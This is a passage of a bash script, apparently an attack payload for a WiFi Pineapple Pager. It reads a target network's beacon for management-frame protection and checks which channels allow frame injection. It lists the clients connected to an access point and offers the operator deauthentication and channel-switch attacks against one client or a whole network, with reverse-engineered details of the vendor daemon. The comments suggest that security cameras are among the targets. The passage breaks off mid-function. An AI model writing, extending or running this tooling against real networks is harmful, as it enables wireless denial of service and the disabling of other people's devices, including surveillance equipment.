# band_rank took a warm cycle from 5.22 s to 0.72 s - 86% of the steady-state cycle was these two.
band_of() {
  local f="$1"
  if (( f >= 5925 )); then BAND_V=6; elif (( f >= 4900 )); then BAND_V=5; elif (( f >= 2400 )); then BAND_V=2; else BAND_V='?'; fi
}

# --- response posture begin ---
# Which disconnect primitive can work against a target, read from its own beacon.
#   RSN element (ID 48): RSN Capabilities, 2 octets little-endian, low octet first on the wire.
#     MFPC (capable)  = bit 7 -> 0x80 of the low octet
#     MFPR (required) = bit 6 -> 0x40 of the low octet
#   Extended Capabilities (ID 127): Beacon Protection = bit 84 -> octet 10 (0-based), mask 0x10.
#     Beacon protection is NOT in the RSNXE (ID 244) -- that element has no such bit.
# Badges: D+C both work | D?+C deauth is per-client, CSA works | C CSA only
#         NONE both blocked | NOINJ radio may not transmit here | ? posture unread
declare -A POSTURE POSTURE_TS POSTURE_RSN_C POSTURE_EXT_C   # badge, read time, and the caps it was read from, per BSSID

hex_octet() {   # hex_octet <hexstring> <index0> -> decimal octet, nonzero rc if short
  local b="${1:$(( $2 * 2 )):2}"
  [ ${#b} -eq 2 ] || return 1
  [[ $b =~ ^[0-9a-fA-F]{2}$ ]] || return 1
  printf '%d' "$(( 16#$b ))"
}

# Injectability is decided by two independent gates in series; a frame needs both.
#   Gate 1 -- pineapd, in userspace.  A compiled-in channel switch, duplicated in
#     pineap_wifi_interface::inject (0x46e800-0x46e826) and
#     interface_tracker::inject_deauth (0x472c66-0x472c8a).  It never asks the kernel
#     about regulatory state (no NL80211_CMD_GET_REG anywhere in the binary), so no
#     regdb edit, country change or `iw reg set` can lift it.  pcap_inject has exactly
#     one call site, inside the gated function, so every injected frame passes it.
#   Gate 2 -- cfg80211, in the kernel.  cfg80211_reg_check_beaconing() rejects a
#     monitor-mode frame whose channel is flagged DISABLED or NO_IR.  RADAR alone does
#     not block it.  This gate DOES follow the regulatory domain, so it is read live.
# Why guessing here is unsafe: a frame rejected by gate 2 is freed with NETDEV_TX_OK,
# so nothing reports an error.  An over-permissive verdict therefore reads back as the
# target having resisted, which is worse than refusing a channel that would have worked.
# Full derivation and re-verification recipe: dev/pager-csa-primitives.md.
PINEAPD_DFS_BLOCKED=" 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 "
declare -A INJ_OK        # "<band>/<channel>" -> 1 permitted by gate 2, 0 refused
INJ_PROBED=0             # 0 not yet probed, 1 probe usable, -1 probe failed -> fallback
INJ_PROBE_TS=0
INJ_TXPHY=""             # phy whose table INJ_OK holds; "" = unresolved, every phy under INJ_SYSFS merged

# inj_probe must run in the PARENT shell: it populates INJ_OK, and csa_injectable is
# reached from posture_from_caps inside $( ), where writes to globals are discarded.
# shellcheck disable=SC2120   # `force` is deliberate API for a manual re-probe; the selftest is its only caller
inj_probe() {   # inj_probe [force] -> 0 when INJ_OK is usable
  local phy d line freq ch dis rows="" n=0 namef="$NET_SYSFS/$RECON_IF/phy80211/name"
  [ "$1" = force ] || { (( INJ_PROBED != 0 && EPOCHSECONDS - INJ_PROBE_TS < POSTURE_TTL )) && return $(( INJ_PROBED == 1 ? 0 : 1 )); }
  INJ_PROBE_TS=$EPOCHSECONDS; INJ_PROBED=-1; INJ_OK=(); INJ_TXPHY=""
  command -v iw >/dev/null 2>&1 || return 1
  # Gate 2 is applied by the phy a frame leaves from, so only THAT phy's table is read: the one
  # behind RECON_IF, named by $NET_SYSFS/$RECON_IF/phy80211/name (the same link the determination
  # plan's A1 step reads with readlink, plan §A1, treating its absence as the radio not having
  # probed).  RECON_IF is that phy because pineapd injects on it -- its live cmdline carries
  # `--inject wlan1mon` (CLAUDE.md "First contact"); falsified by
  # `cat /proc/$(pgrep -n pineapd)/cmdline | tr "\0" " "` showing --inject on another interface,
  # in which case RECON_IF is the wrong phy to read.
  # Merging every phy under $INJ_SYSFS -- the old behaviour, kept only as
  # the fallback for when that file cannot be read -- is a plain last-row-wins overwrite per
  # band/channel key in glob order, over-permissive wherever two phys share a band and disagree:
  # the receive-only radio0 registers 2.4 GHz as the transmitter does (FCC antenna map and UCI
  # band '2g', dev/pager-6ghz-determination-plan.md Addendum 2c), so every 2/<ch> key is written
  # twice and the merged verdict is whichever phy sorts last, not the injecting one.  Hence the
  # fallback is logged, never silent.  A resolved phy whose table reads empty fails the probe
  # (conservative set) rather than merging radios that cannot be the transmitter.
  if phy=$(cat "$namef" 2>/dev/null) && [[ $phy =~ ^[^[:space:]/]+$ ]]; then
    INJ_TXPHY="$phy"; rows=$(iw phy "$phy" channels 2>/dev/null)$'\n'
    log inj "probe: tx phy $phy ($namef)"
  else
    for d in "$INJ_SYSFS"/*; do
      [ -e "$d" ] || continue
      phy=${d##*/}; n=$((n + 1))
      rows+=$(iw phy "$phy" channels 2>/dev/null)$'\n'
    done
    log warn "probe: tx phy unresolved ($namef unreadable); merged $n phys under $INJ_SYSFS"
    ui_ok && LOG yellow "regulatory probe: tx phy unresolved, merged $n phys (over-permissive where they disagree)"
  fi
  [ -n "${rows//[[:space:]]/}" ] || return 1
  local band
  while IFS='|' read -r freq ch dis; do
    [[ $freq =~ ^[0-9]+$ && $ch =~ ^[0-9]+$ ]] || continue
    if (( freq >= 5925 )); then band=6; elif (( freq >= 4900 )); then band=5; elif (( freq >= 2400 )); then band=2; else continue; fi
    if (( dis == 0 )); then INJ_OK[$band/$ch]=1; else INJ_OK[$band/$ch]=0; fi
  done < <(printf '%s' "$rows" | inj_parse_channels)
  (( ${#INJ_OK[@]} )) || return 1
  INJ_PROBED=1; return 0
}

# Parsed against the shipped iw's own format strings, not an invented layout: the channel
# line is "\t* %d MHz [%d] " optionally followed by "(disabled)", then indented attribute
# lines, of which only the NO_IR one blocks transmission ("Radar detection" does not -- gate 2
# prohibits DISABLED and NO_IR, never RADAR).  iw spells that attribute three ways: "No IR" when
# the kernel sets both NO_IR and the separate legacy NO_IBSS slot, otherwise "Passive scan" or
# "No IBSS" -- all three must block, or an older kernel's NO_IR channel reads as injectable.
# The "phy%d %d MHz [%d]:" layout that other iw subcommands print also matches the channel rule, but
# the frequency is taken as the FIRST digit run on the line, so such a row carries the phy index as
# its frequency ("phy1 5180 MHz [36]:" -> 1|36|0 under mawk and BusyBox awk; pinned by the selftest)
# and inj_probe drops it at its band check (< 2400).  Only `iw phy <phy> channels` output is supported.
inj_parse_channels() {   # stdin: iw phy <phy> channels -> "freq|channel|blocked" rows
  awk '
      function flush() { if (ch != "") printf "%d|%d|%d\n", freq, ch, bad }
      /MHz[ \t]*\[[0-9]+\]/ {
          flush()
          freq = $0; sub(/^[^0-9]*/, "", freq); sub(/[^0-9].*$/, "", freq)
          ch = $0; sub(/^.*\[/, "", ch); sub(/\].*$/, "", ch)
          bad = ($0 ~ /\(disabled\)/) ? 1 : 0
          next
      }
      /^[ \t]+(No IR|Passive scan|No IBSS)[ \t]*$/ { if (ch != "") bad = 1; next }
      /^[Bb]and [0-9]+:/    { flush(); ch = ""; next }
      END { flush() }'
}

csa_injectable() {   # csa_injectable <band> <channel> -> 0 when a frame can actually leave
  local b="$1" c="$2"
  [[ $c =~ ^[0-9]+$ ]] || return 1
  # gate 1: pineapd's compiled-in refusals, independent of regulatory state
  [ "$b" = 5 ] && [[ $PINEAPD_DFS_BLOCKED == *" $c "* ]] && return 1
  # 6 GHz stays refused: pineapd rejects a channel whose band field is 6 GHz outright,
  # and whether our command path produces that encoding is unverified.  Until the
  # determination plan settles it on real hardware, refusing is the safe verdict.
  [ "$b" = 6 ] && return 1
  # gate 2: the live regulatory state, when we managed to read it
  if (( INJ_PROBED == 1 )); then
    [ "${INJ_OK[$b/$c]}" = 1 ] && return 0
    return 1                 # 0 = refused, unset = this phy never registered the channel
  fi
  # Fallback when the probe is unavailable: only what is injectable under BOTH the US
  # and the world ("00") domain, since we cannot tell which one is live.  Under 00,
  # 5 GHz 149-165 and 2.4 GHz 12-14 carry NO_IR and 2.4 GHz 12-14 are DISABLED under US.
  # 5 GHz 36-48 is in the set only because the SHIPPED regulatory.db drops NO-IR from 00's
  # 5170-5250 rule -- the vendor's one edit to upstream wireless-regdb 2025.02.20
  # (dev/pager-6ghz-determination-plan.md §C2, a reading of the shipped db).  Upstream 00 marks
  # 36-48 NO-IR, so a db rebuilt from upstream makes this branch over-permissive on 36-48 and
  # it must then shrink to 2.4 GHz 1-11.  Falsifier: `iw phy <txphy> channels` printing No IR
  # on 5180 MHz while `iw reg get` says 00.
  case "$b" in
    2) (( c >= 1 && c <= 11 )) && return 0; return 1 ;;
    5) (( c >= 36 && c <= 48 )) && return 0; return 1 ;;
    *) return 1 ;;
  esac
}

posture_from_caps() {   # posture_from_caps <rsncaps_hex|-> <extcap_hex|-> <band> <channel> -> badge
  local rsn="$1" ext="$2" band="$3" ch="$4" lo o mfpc=0 mfpr=0 bp=0
  csa_injectable "$band" "$ch" || { printf 'NOINJ'; return 0; }
  if [ -z "$rsn" ] || [ "$rsn" = - ]; then printf '?'; return 0; fi
  lo=$(hex_octet "$rsn" 0) || { printf '?'; return 0; }
  (( lo & 0x80 )) && mfpc=1
  (( lo & 0x40 )) && mfpr=1
  if [ -n "$ext" ] && [ "$ext" != - ]; then
    if o=$(hex_octet "$ext" 10); then (( o & 0x10 )) && bp=1; fi
  fi
  if   (( mfpr && bp )); then printf 'NONE'
  elif (( mfpr ));       then printf 'C'
  elif (( mfpc ));       then printf 'D?+C'
  else                        printf 'D+C'
  fi
}

# The three operator-selectable attacks. The badge advises; it never decides.
#   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc, one client
#   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel switch, WHOLE BSS
#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three types, WHOLE BSS
#
# ONLY DEAUTH IS TARGETED, and only on a client row. attack_scope() below is the one place that
# decides; the picker's ' bss' marker and the pre-transmit confirm both read it, so the breadth is
# stated where the operator chooses and again before anything is sent.
#   CSA has no [target] argument at all, so its breadth is certain from the signature.  [V]
#   BOTH has one in hak5cmd's help text, and the help text is wrong: pineAPdDeauthAll parses ONE
#        MAC where pineAPdDeauth parses two, and its request struct carries no target field. The
#        discriminating measurements are in CLAUDE.md "2.0.0-stable, analysed"; the frame split
#        that carries them is StartDeauth 32 against StartDeauthAll/StartDeauthCsa 28.  Readings
#        [V] from the 1.1.3 and 2.0.0 daemons; "parses the bssid, discards the target" is [A] --
#        falsify by firing BOTH at one client among several and seeing whether the others stay
#        associated. resp_fire still passes three positionals; json.Unmarshal drops the extra.
#   NB the three pineAPd* HTTP handlers share one 16-byte http.HandlerFunc frame, so the frame
#      does NOT discriminate among them -- an earlier revision of this comment said it did, and
#      attributed the 32-vs-28 split to the wrong trio.
# posture_opts still orders by efficacy (best first), and pick_list preselects element 0, so a
# BSS-wide attack is the default on the common badges. That is deliberate: the marker and the
# confirm carry the breadth, rather than demoting the attack most likely to work.
response_cmd() {
  case "$1" in
    DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
    CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
    # BOTH is the opcode-400 deauth, and resp_fire issues the CSA as a SECOND command. It is not
    # _ALL: StartDeauthAll emits li a0,402 (0x0086c62c), the same command id as StartDeauthCsa, so
    # PINEAPPLE_DEAUTH_CLIENT_ALL is the CSA command under another name and builds no deauth frame
    # at all. pineapd HAS a deauth+CSA opcode -- 401, dispatched correctly at 0x473528 -- but no
    # shipped command sends it (li/ori a0,401 occur zero times in the Go daemon), so the only way
    # to get what 401 would have done is to send both ourselves. CLAUDE.md "Third contact".
    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
    *)      printf '' ;;
  esac
}

# attack_scope <attack key> -> cli | bss.  Reads R_TARGET, so call it after resp_target.
# Read from the signatures (response_cmd above): CSA takes <bssid> <ch> and has no target argument
# at all, so it is BSS-wide by construction; _ALL advertises [target] but parses one MAC, so its
# target is accepted and discarded; only DEAUTH parses two and can aim.
# [A] An AP row resolves R_TARGET to ff:ff:ff:ff:ff:ff and this reports that as BSS-wide. Nothing
# in the repo records pineapd honouring a broadcast [target] rather than rejecting it. Note the
# failure is NOT self-announcing: an earlier version of this comment claimed a rejected attack
# would leave "every subject reading NO_EFFECT, the safe direction", which is wrong -- resp_verdict
# returns MOVED for a subject that goes absent, and for a stalled counter whose last-seen did not
# advance, so an idle camera reads MOVED whether or not anything was transmitted. Only NO_EFFECT is
# strong evidence here; MOVED on a quiet device is weak, and a rejected broadcast target would be
# indistinguishable from a successful one.
# Falsified by: PINEAPPLE_DEAUTH_CLIENT <bssid> ff:ff:ff:ff:ff:ff <ch> disconnecting one client, or
# none, with several associated.
attack_scope() {
  case "$1" in
    DEAUTH) [ "$R_TARGET" = 'ff:ff:ff:ff:ff:ff' ] && printf 'bss' || printf 'cli' ;;
    *)      printf 'bss' ;;
  esac
}

# posture_opts <badge> -> viable attack keys, best first; empty when nothing can reach the air
posture_opts() {
  case "$1" in
    'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
    # DEAUTH leads on every remaining badge, and the badge no longer changes the order, because on
    # 1.1.3 it is the ONLY key that reaches the air at all -- see posture_expect for the parse path
    # that kills the other two. The ordering used to lead CSA under PMF, which preselected a key
    # that provably transmits nothing. BOTH and CSA stay offered: the operator asked for them, and
    # a firmware that fixes _ALL would make them live again without a code change here.
    *)              printf 'DEAUTH BOTH CSA' ;;
  esac
}

# posture_expect <badge> <attack key> -> works | partial | blocked | unknown
# Labels each option honestly in the picker so a deliberate no-hope attempt is still the operator's call.
posture_expect() {
  local b="$1" k="$2" inj=0
  # The label has to follow the SENDER, not just the badge. Caught by the audit: with an injector
  # configured -- the one configuration the whole CSA hook exists to enable -- an injector-blind
  # label told the operator CSA was fw-broken while csa_issue was routing it to pagerinj and the
  # loot row recorded two legs landing. The picker lied in exactly the case it mattered.
  [ -n "${CSA_INJECTOR:-}" ] && [ -x "${CSA_INJECTOR:-}" ] && inj=1
  [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
  [ "$b" = NONE ]  && { printf 'blocked'; return 0; }
  # CSA and BOTH transmit NOTHING on this firmware, whatever the beacon says, so the badge cannot
  # speak for them. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
  # fc:58:5a:08:42:15 ch 8, PINEAPPLE_DEAUTH_CLIENT with ff:ff:ff:ff:ff:ff dropped a client on
  # demand while PINEAPPLE_DEAUTH_CLIENT_ALL with that SAME address, minutes later, did nothing --
  # one address, one channel, one BSSID, two outcomes -- and the mechanism IS settled: _ALL and _CSA
  # send the SAME opcode. pineapd's one deauth handler dispatches on a numeric id (400 deauth, 401
  # deauth+CSA, 402 CSA) and the Go daemon emits li a0,400 in StartDeauth, li a0,402 in
  # StartDeauthCsa and li a0,402 in StartDeauthAll -- 401 appears nowhere in the binary, so the
  # deauth+CSA path is dead code that has never run. BOTH therefore builds NO deauth frame; the
  # ff:ff:ff:ff:ff:ff it writes is dead data the 402 path never reads. All it queues is a CSA, and
  # that CSA carries Channel Switch Count 0 AND a hardcoded New Channel Number of 14 (2484 MHz,
  # Japan-only, absent from the US table), either of which alone would stop a US client acting on
  # it -- and it only transmits if pineapd catches a beacon from the BSSID inside a 10 s TTL.
  # hak5cmd exits 0 and prints nothing on every path, so none of this is visible above the socket,
  # which is exactly why the operator needs the label. CLAUDE.md "Third contact" has the addresses.
  # NOTE a real "both" is still available to us and is NOT implemented here: issue DEAUTH (400) and
  # CSA (402) as two commands. That changes what the radio transmits, so it is the operator's call.
  # Falsified by: _ALL or _CSA disconnecting any client, on any firmware, from any caller.
  [ "$inj" = 0 ] && case "$k" in CSA) printf 'fw-broken'; return 0 ;; esac
  [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
  case "$k" in
    DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
    # BOTH is that same deauth plus a CSA that cannot land, so the badge governs the half that can.
    # "deauth only" promises the deauth and says the CSA is along for the ride, which is the honest
    # label for a two-command attack whose second command is a known no-op on this firmware.
    # With an injector the CSA leg really transmits, so "fw-broken" would be false; but whether a
    # corrected CSA MOVES anything is the open 17a question, so the label says what is sent rather
    # than promising an effect. Without one, the firmware command cannot land and says so.
    CSA)         printf 'injector' ;;
    BOTH)        if [ "$inj" = 1 ]; then
                   case "$b" in 'D+C') printf 'deauth+csa' ;; 'D?+C') printf 'partial' ;; *) printf 'injector' ;; esac
                 else
                   case "$b" in 'D+C') printf 'deauth only' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac
                 fi ;;
    *)           printf 'unknown' ;;
  esac
}

# ---- beacon posture read -------------------------------------------------------------------
# Walks a captured beacon's tagged parameters for element 48 (RSN) and 127 (Extended Capabilities).
# No managed interface on this device can scan 5/6 GHz (radio0 is 2g, radio1 is monitor-only), so
# the beacon on RECON_IF is the only posture source that covers every band CamHound reports on.
POSTURE_RSN=-; POSTURE_EXT=-; BCN_HEX=""; BCN_IES=0

hex_u16le() {   # hex_u16le <hexstring> <index0> -> decimal, nonzero rc if short
  local a b
  a=$(hex_octet "$1" "$2") || return 1
  b=$(hex_octet "$1" "$(( $2 + 1 ))") || return 1
  printf '%d' "$(( a + b * 256 ))"
}

ie_find() {   # ie_find <hexstring> <first element octet> <element id> -> payload hex, rc 1 if absent
  local h="$1" p="$2" want="$3" id len n
  n=$(( ${#h} / 2 ))
  while (( p + 2 <= n )); do
    id=$(hex_octet "$h" "$p") || return 1
    len=$(hex_octet "$h" "$(( p + 1 ))") || return 1
    (( p + 2 + len > n )) && return 1          # truncated element chain: stop, do not guess
    if (( id == want )); then printf '%s' "${h:$(( (p + 2) * 2 )):$(( len * 2 ))}"; return 0; fi
    p=$(( p + 2 + len ))
  done
  return 1
}

rsn_caps() {   # rsn_caps <element 48 payload hex> -> 2-octet RSN Capabilities hex, low octet first
  local h="$1" p=6 n cnt                       # skip version (2) + group cipher suite (4)
  n=$(( ${#h} / 2 ))
  (( n >= 8 )) || return 1
  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # pairwise suite list
  (( p + 2 <= n )) || return 1
  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # AKM suite list
  (( p + 2 <= n )) || return 1
  printf '%s' "${h:$(( p * 2 )):4}"
}

# Watch needs tcpdump plus a hex dumper. Both pcap readers below fall back to od, so either
# dumper satisfies it; requiring hexdump specifically disabled Watch on hosts that have only od
# (most non-busybox Linux) for no reason. A Pager always has busybox hexdump, so this only ever
# mattered off-device -- but it made laptop and harness runs fail in a way that looked like a bug.
capture_ready() {   # capture_ready -> 0 when a Watch capture can be taken and parsed
  command -v tcpdump >/dev/null 2>&1 || return 1
  command -v hexdump >/dev/null 2>&1 || command -v od >/dev/null 2>&1
}

pcap_bytes() {   # whole file as one lowercase hex string (od fallback mirrors pcap_words)
  if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/1 "%02x"' "$1" 2>/dev/null
  else od -An -v -tx1 "$1" 2>/dev/null | tr -d ' \n'; fi
}

beacon_find() {   # beacon_find <pcap> -> sets BCN_HEX and BCN_IES at the first beacon's elements
  local f="$1" h p n rec rt fc
  h=$(pcap_bytes "$f") || return 1
  [ -n "$h" ] || return 1
  case "${h:0:8}" in d4c3b2a1|a1b2c3d4|4d3cb2a1|a1b23c4d) ;; *) return 1 ;; esac
  n=$(( ${#h} / 2 )); p=24                     # pcap global header
  while (( p + 16 <= n )); do
    rec=$(hex_u16le "$h" "$(( p + 8 ))") || return 1   # incl_len; low 16 bits suffice for a beacon
    p=$(( p + 16 ))
    (( rec > 0 && p + rec <= n )) || return 1
    rt=$(hex_u16le "$h" "$(( p + 2 ))") || return 1    # radiotap it_len
    if (( rt >= 8 && rt + 36 <= rec )); then
      fc=$(hex_octet "$h" "$(( p + rt ))")
      # 0x80 = protocol version 0, type management, subtype beacon
      if [ "$fc" = 128 ]; then BCN_HEX="$h"; BCN_IES=$(( p + rt + 36 )); return 0; fi
    fi
    p=$(( p + rec ))
  done
  return 1
}

POSTURE_BADGE='?'
posture_read_pcap() {   # posture_read_pcap <pcap> <band> <channel> -> badge (stdout and POSTURE_BADGE)
  local f="$1" band="$2" ch="$3" rsn ext caps
  POSTURE_RSN=-; POSTURE_EXT=-
  if beacon_find "$f"; then
    if rsn=$(ie_find "$BCN_HEX" "$BCN_IES" 48); then
      caps=$(rsn_caps "$rsn") && POSTURE_RSN="$caps"
    else
      POSTURE_RSN=0000                         # no RSN element at all: open network, no PMF
    fi
    ext=$(ie_find "$BCN_HEX" "$BCN_IES" 127) && POSTURE_EXT="$ext"
  fi
  POSTURE_BADGE=$(posture_from_caps "$POSTURE_RSN" "$POSTURE_EXT" "$band" "$ch")
  printf '%s' "$POSTURE_BADGE"
}

capture_beacon() {   # capture_beacon <bssid> -> pcap path on stdout, rc 1 on failure
  local bssid="$1" out="/tmp/cs_bcn_$$.pcap" p w=0
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  rm -f "$out"
  tcpdump -i "$RECON_IF" -nn -s 0 -c "$BCN_CAP_COUNT" -w "$out" \
    "type mgt subtype beacon and wlan addr2 $bssid" >/dev/null 2>&1 & p=$!
  child_add "$p"
  while (( w < BCN_CAP_SECS )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$(( w + 1 )); done
  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
  [ -s "$out" ] || { rm -f "$out"; return 1; }
  printf '%s' "$out"
}

# pcap_stream file -> one unsigned byte per line. The byte-oriented twin of pcap_words, and the
# reason this walker is not written with pcap_bytes + ${h:off:2} like beacon_find: bash substring
# extraction costs O(whole string), so that shape is O(records x filesize) and overruns the EXAMINE
# lock on anything bigger than a beacon. Measured, with the method and numbers, in RESPONSE.md 13a-i.
pcap_stream() { if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/1 "%u\n"' "$1" 2>/dev/null; else od -An -v -tu1 -w1 "$1" 2>/dev/null | tr -d ' '; fi; }

# CLI_AWK: walk a pcap of data frames and report which stations talked to one BSSID.
# Reads the frame itself rather than trusting the capture filter, because a filter cannot tell us
# WHICH address is the client: addr2 is always the transmitter, so on a ToDS (uplink) frame addr2 is
# the client, but on a FromDS (downlink) frame addr2 is the AP. Harvesting addr2 unconditionally
# would enter the AP as its own client and break resp_snapshot's invariant that the AP is never a
# subject -- and one AP subject reading NO_EFFECT drags the whole attempt to NO_EFFECT.
# Emits keyed lines for the caller to read IN THE PARENT SHELL: ITMAX/RECS/SHORT/CLI.
# With -v mode=pairs it answers the INVERSE question -- which BSSID each station talks to, or only
# -v sta=<mac> -- as "PAIR <sta> <bssid> <n>" for every pair seen at least twice (assoc_lookup). It
# is the same DS-bit decode with nothing held fixed: no bss is needed, a group-addressed or own
# address on either side is never a pair, and neither is a frame whose two addresses are equal.
# With mode unset the membership walk below is untouched.
CLI_AWK='
function mac(o) { return sprintf("%02x:%02x:%02x:%02x:%02x:%02x", p[o], p[o+1], p[o+2], p[o+3], p[o+4], p[o+5]) }
function u16(a, b) { return be ? a * 256 + b : b * 256 + a }
function le16(a, b) { return b * 256 + a }   # radiotap is little-endian by spec, whatever the pcap is
function u32(a, b, c, d) { return be ? ((a * 256 + b) * 256 + c) * 256 + d : ((d * 256 + c) * 256 + b) * 256 + a }
BEGIN { st = 0; i = 0; itmax = 0; recs = 0; short = 0 }
{ v = $1 + 0
  if (st == 0) { g[i++] = v
    if (i == 24) { m = sprintf("%02x%02x%02x%02x", g[0], g[1], g[2], g[3])
      if (m == "d4c3b2a1" || m == "4d3cb2a1") be = 0
      else if (m == "a1b2c3d4" || m == "a1b23c4d") be = 1
      else { print "ERR magic " m; bad = 1; exit 1 }
      snap = u32(g[16], g[17], g[18], g[19])   # snaplen from the header, to tell truncation apart
      st = 1; i = 0 }
    next }
  if (st == 1) { h[i++] = v
    if (i == 16) { incl = u32(h[8], h[9], h[10], h[11]); i = 0
      if (incl <= 0) { print "ERR incl " incl; bad = 1; exit 1 }
      want = incl; np = 0; split("", p); st = 2 }
    next }
  if (np < 256) p[np] = v
  np++
  if (np < want) next
  recs++
  do {
    if (want < 4) break
    rt = le16(p[2], p[3])         # NOT u16: the radiotap header is little-endian regardless
    if (rt > itmax) itmax = rt
    if (rt < 8) break
    if (rt + 16 > want) {
      # Two different causes, and blaming the snap for both sends the operator to the wrong knob:
      # a record at the snaplen was CUT (raise CLI_CAP_SNAP), a shorter one is simply a small
      # frame -- an ACK-sized or Null frame that never held addr2 to begin with.
      if (snap > 0 && want >= snap) trunc++; else runt++
      short++; break }
    if (int(p[rt] / 4) % 4 != 2) break
    ds = p[rt + 1] % 4
    if (ds == 1) { bo = rt + 4; co = rt + 10 }
    else if (ds == 2) { bo = rt + 10; co = rt + 4 }
    else break
    b = mac(bo); c = mac(co)
    if (mode == "pairs") {
      if (sta != "" && c != sta) break
      if (b == c) break
      if (p[bo] % 2 == 1 || p[co] % 2 == 1) break
      if (index(own, " " c " ") > 0 || index(own, " " b " ") > 0) break
      pair[c " " b]++
      break
    }
    if (b != bss) break
    if (c == bss) break
    if (p[co] % 2 == 1) break
    if (index(own, " " c " ") > 0) break
    seen[c]++
  } while (0)
  st = 1; i = 0
}
END { if (bad) exit 1
  if (st == 0) { print "ERR truncated header"; exit 1 }   # never reached the magic: not a pcap at all
  print "ITMAX " itmax; print "RECS " recs; print "SHORT " short
  print "TRUNC " trunc + 0; print "RUNT " runt + 0; print "SNAP " snap + 0
  for (c in seen) if (seen[c] >= 2) print "CLI " c
  for (k in pair) if (pair[k] >= 2) print "PAIR " k " " pair[k] }'

# bss_clients <pcap> <bssid> -> keyed lines on stdout; rc 1 when the file is unreadable or not a pcap.
# PARSE IT IN THE PARENT SHELL: the counts have to reach the caller, and a pipe or < <(...) would
# set them in a subshell -- the same trap posture_of documents for its caps globals.
# A station must be seen at least TWICE to be admitted: a monitor interface delivers FCS-corrupt
# frames whose addresses are garbage, and one such frame would otherwise invent a subject. The cost
# is that a station sending exactly one frame in the window is missed.
bss_clients() {
  local f="$1" bss="${2,,}"
  [ -s "$f" ] || return 1
  pcap_stream "$f" | awk -v bss="$bss" -v own="$OWN_MACS" "$CLI_AWK"
}

# capture_bss <bssid> -> pcap path on stdout, rc 1 on failure.
# The OR filter wants both directions; PLAN_v2 item 13b records "OR filter fails -> two instances"
# as an open risk on this libpcap, so one fallback to the uplink-only shape is built in rather than
# booked as a bench step. tcpdump writes the 24-byte global header as soon as it arms, so an absent
# or empty file after a second means it refused the filter; exactly 24 bytes means it armed and
# heard nothing. Those are different answers and the caller reports them differently.
capture_bss() {
  local bss="$1" out="/tmp/cs_mem_$$.pcap" p w=0 filt
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  rm -f "$out"
  filt="type data and (wlan addr1 $bss or wlan addr2 $bss)"
  tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "$filt" >/dev/null 2>&1 & p=$!
  child_add "$p"; sleep 1; w=1
  if [ ! -s "$out" ] && ! kill -0 "$p" 2>/dev/null; then
    child_del "$p"
    log resp "member capture: OR filter did not arm, retrying uplink-only"
    filt="type data and wlan addr1 $bss"
    tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "$filt" >/dev/null 2>&1 & p=$!
    child_add "$p"; sleep 1; w=1
  fi
  while (( w < CLI_CAP_SECS )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$(( w + 1 )); done
  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
  [ -s "$out" ] || { rm -f "$out"; return 1; }
  printf '%s' "$out"
}

POSTURE_LAST='?'
posture_of() {   # posture_of <bssid> <band> <channel> -> badge (stdout and POSTURE_LAST), cached per BSSID
  # Call it directly, not in $(...): the cache, POSTURE_RSN and POSTURE_EXT are set in the caller's shell.
  local bssid="$1" band="$2" ch="$3" f b now="$EPOCHSECONDS" locked_here=0
  # Both early returns below answer without reading a beacon, so the caps globals must not keep the
  # PREVIOUS target's values -- resp_write records them as this response's rsn_caps/beacon_prot and
  # would otherwise attribute another BSSID's posture to this row. The caps are cached per BSSID beside
  # the badge, so a hit restores THIS target's caps instead of blanking its loot row.
  POSTURE_RSN=-; POSTURE_EXT=-
  if [ -n "${POSTURE[$bssid]}" ] && (( now - ${POSTURE_TS[$bssid]:-0} < POSTURE_TTL )); then
    POSTURE_RSN="${POSTURE_RSN_C[$bssid]:--}"; POSTURE_EXT="${POSTURE_EXT_C[$bssid]:--}"
    POSTURE_LAST="${POSTURE[$bssid]}"; printf '%s' "$POSTURE_LAST"; return 0
  fi
  # A channel we may not transmit on needs no capture: the answer is NOINJ whatever the beacon says.
  if [ "$(posture_from_caps - - "$band" "$ch")" = NOINJ ]; then
    POSTURE[$bssid]=NOINJ; POSTURE_TS[$bssid]=$now; POSTURE_RSN_C[$bssid]=-; POSTURE_EXT_C[$bssid]=-; POSTURE_LAST=NOINJ; printf 'NOINJ'; return 0
  fi
  # Recon hops while unlocked, so a 4 s capture on one BSSID mostly misses; hold the channel for it.
  if [ "$WATCH_LOCKED" != 1 ]; then lock_target "$bssid" $(( BCN_CAP_SECS + 5 )) "$ch" >/dev/null; locked_here=1; fi
  if f=$(capture_beacon "$bssid"); then posture_read_pcap "$f" "$band" "$ch" >/dev/null; b="$POSTURE_BADGE"; rm -f "$f"; else POSTURE_RSN=-; POSTURE_EXT=-; b='?'; fi
  (( locked_here )) && unlock_target
